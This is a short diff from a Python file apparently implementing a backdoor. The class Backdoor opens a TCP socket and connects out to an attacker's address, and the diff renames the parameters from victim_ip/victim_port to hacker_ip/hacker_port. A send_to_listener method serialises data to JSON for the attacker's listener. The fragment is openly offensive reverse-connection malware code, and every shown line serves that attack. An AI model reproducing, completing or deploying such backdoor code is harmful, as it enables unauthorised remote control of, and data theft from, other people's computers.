@@ -9,9 +9,9 @@ import sys
 
 class Backdoor:
     # establish TCP socket
-    def __init__(self, victim_ip, victim_port):
+    def __init__(self, hacker_ip, hacker_port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((victim_ip, victim_port))
+        self.connection.connect((hacker_ip, hacker_port))
 
     def send_to_listener(self, data):
         json_data = json.dumps(data)
